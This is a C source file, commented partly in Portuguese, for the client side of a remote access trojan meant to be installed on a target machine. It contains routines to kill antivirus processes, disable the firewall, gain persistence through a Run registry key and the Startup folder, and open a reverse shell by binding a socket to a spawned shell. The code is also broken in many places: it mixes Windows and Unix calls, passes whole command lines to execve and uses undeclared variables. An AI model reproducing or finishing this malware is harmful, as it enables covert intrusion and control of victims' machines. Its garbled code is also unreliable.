/*
Esse é o lado "cliente". Programa qúe será instalado na máquina alvo, com o servidor na monitoria.

Podendo mandar e receber arquivos, ativar keylogger, e mudar o proxy da máquina.

JÁ PRONTOS: desativar anti-virus e firewallro
            copiar-se para o registro
            copiar-se para o menu iniciar

terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.

// use without abuse.

// coder  mrx6s0

*/

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <string.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <X11/Xlib.h>

//#define FILENAME "/home/mrx6s0/key.log"

#define remote_addr "127.0.0.1"

#define remote_port 55766

//#define pass "mrx6s0"

/* struct of cong=figurations to target. */

  typedef struct client {

  char REMOTE_ADDR;
  int REMOTE_PORT;

  } Client;

  typedef struct connection_success {

  int x;

  } Connection_success;

  x = 1;

  void error (char *err)

 {

  perror(err);
  exit(EXIT_FAILURE);

 } /* exit without exceptions... and keep the routine.

  //function  to disable antivirus. */

void kill_antivirus()

  {
     //int i;
     FILE *arq;

    arq = fopen("av.txt", "rb");
    if(arq == 0)
        return;
    else
       while( (arq=fgetc(arq)) != EOF)
         if (arq = "\n")

   execve("TASKLIST /FI 'STATUS eq RUNNING'", 0, 0);

   execve("TASKKILL /F /IM \{}\ '>> NUL'", 0, 0);

   return;

}

/* in this, i use a .vbs file, and invoked from execv(); */

void kill_firewall()

  {

   execve("firewall.vbs", 0, 0);

   return;

  }

  // function that auto copy the software into the register of target machine

void auto_copy()

  {

     execve("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v wins32 /d C:/wins32.exe",0,0);
     return;

  }

void copy_to_registry()

  {
    execve("copy /Y meuarquivo.exe C:\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Inicializar",0,0);
    return;
  }

  /*função para o programa rodar em background, como um deamon

   create connection */
  void shell()

  {

    struct sockaddr_in s;
  
    XFreeCursor;

    pid_t pid;
	pid = fork();

	if(pid < 0 )
        exit(EXIT_FAILURE);

    if(pid > 0)
        exit(EXIT_SUCCESS);

    if (setsid() < 0)
        exit(EXIT_FAILURE);

        signal(SIGCHLD, SIG_IGN);
        signal(SIGHUP, SIG_IGN);

        pid = fork();

        if (pid < 0)
            exit(EXIT_FAILURE);

        if (pid > 0)
            exit(EXIT_SUCCESS);

        sigmask(0);

        chdir("/, C:/Windows/System32");

        int k;

        for (k = sysconf(_SC_OPEN_MAX); k >= 0; k--)

        {
            close(k);

    /* setting up the connection */

    s.sin_family = AF_INET;
    s.sin_addr.s_addr = inet_addr(remote_addr);
    s.sin_port = htons(remote_port);
    memset(s.sin_zero, '\0', sizeof s.sin_zero);
   // socklen_t = sizeof s;

    (x) = socket(AF_INET, SOCK_STREAM, 0);
    usleep(30);

    (connect(x, (struct sockaddr *)&s, sizeof(s)));
     if (connect == -1)
     perror("socket(SOCKET_CONNECT)connect_failed");

    if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
    perror("setsockopt(SO_REUSEADDR)failed");


    send(x,"\nConnected\n",12,0),send(x,"\n#root > /n",7,0);
    fflush(stdout);
    dup2(x, 0),dup2(x, 1),dup2(x, 2);

    execve("/bin/sh", 0, 0),execve("C:\\windows\\System32\\cmd.exe ", 0, 0),execve("netcat", 0, 0);

     }

    return;

    }

/* execute the program */

   int main(int argc, char **argv[])

   {

    repete:

    while(1)

    shell();
	   
    auto_copy();	   
    copy_to_registry();
    kill_antivirus();
    kill_firewall();


    goto repete;
	   
   }
